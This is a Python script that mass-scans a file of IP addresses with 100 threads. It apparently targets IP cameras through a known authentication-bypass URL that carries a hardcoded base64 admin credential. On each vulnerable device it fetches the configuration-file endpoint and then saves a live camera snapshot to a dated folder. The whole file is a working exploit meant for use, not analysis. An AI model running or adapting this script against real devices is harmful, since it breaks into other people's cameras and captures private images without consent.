import requests
import os
import time
from datetime import date
from concurrent.futures import ThreadPoolExecutor, as_completed

today = date.today()
PATH = today.strftime("%d-%m-%Y")

def read_file():
    """
    reads ip list
    """
    if os.path.exists("ips"):
        with open("ips") as f:
            content = f.readlines()
            content = [x.strip() for x in content] 
            f.close()
        return content
    else:
        return 0

def capture_snapshop(ip):
    response = requests.get("http://" + ip + "/onvif-http/snapshot?auth=YWRtaW46MTEK")
    f = open(PATH + '/' +ip, "wb")
    f.write(response.content)
    f.close

def exploit(ip):

    try:
        request = requests.get('http://' + ip + '/System/configurationFile?auth=YWRtaW46MTEK', timeout=2)
        if request.headers['content-type'] == 'application/binary; charset="UTF-8"':
            print(ip + ' maybe is something trying to capture snapshot')
            capture_snapshop(ip)
        else: 
            print('was live but garbage ' + ip)
    except requests.exceptions.Timeout:
       pass
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.ContentDecodingError:
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!" + ip + "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n")
            
            

def main():
    start_time = time.time()
    today = date.today()
    if not os.path.exists(PATH):
        os.mkdir(PATH)

    ips = read_file()

    with ThreadPoolExecutor(max_workers=100) as executor:
        for ip in ips:
            executor.submit(exploit, ip)

    elapsed_time = time.time() - start_time
    print(elapsed_time)
if __name__ == "__main__":
    main()



